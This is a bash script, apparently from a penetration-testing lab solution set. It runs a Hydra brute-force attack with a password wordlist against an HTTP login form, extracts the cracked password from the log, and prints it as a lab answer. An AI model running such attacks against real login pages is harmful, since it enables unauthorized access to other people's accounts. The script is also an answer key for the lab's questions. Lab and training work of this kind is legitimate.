#!/usr/bin/env bash
# Phase 1 — Hydra login brute force (Lab questions 1 & 2)
# Grounded in: ManKier hydra(1) man page; Pentesting.site Hydra cheat sheet.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=config.sh
source "$HERE/config.sh"
# shellcheck source=lib/common.sh
source "$HERE/lib/common.sh"

c_blue "=== Phase 1: Hydra http-post-form login brute force ==="
[ -f "$WORDLIST" ] || { c_red "Wordlist not found: $WORDLIST (gunzip rockyou.txt.gz?)"; exit 1; }

# http-post-form takes three colon-separated fields:
#   <path> : <body with ^USER^/^PASS^ placeholders> : <failure/success condition>
FORM="${LOGIN_PATH}:${USER_FIELD}=^USER^&${PASS_FIELD}=^PASS^:${FAIL_CONDITION}"

run_and_capture "q1_q2_hydra" "Hydra brute force login" -- \
  hydra -l "$USERNAME" -P "$WORDLIST" "$TARGET_HOST" http-post-form "$FORM" -V -f

# Pull the recovered credential straight out of the Hydra log for Q1.
PW=$(grep -Eo 'password:[[:space:]]*[^[:space:]]+' "$OUT_DIR/q1_q2_hydra.txt" | tail -n1 | awk '{print $2}')
echo
c_green "ANSWER Q1 (password): ${PW:-NOT FOUND — check output/q1_q2_hydra.txt}"
c_green "ANSWER Q2 (command) : hydra -l $USERNAME -P $WORDLIST $TARGET_HOST http-post-form \"$FORM\" -V"
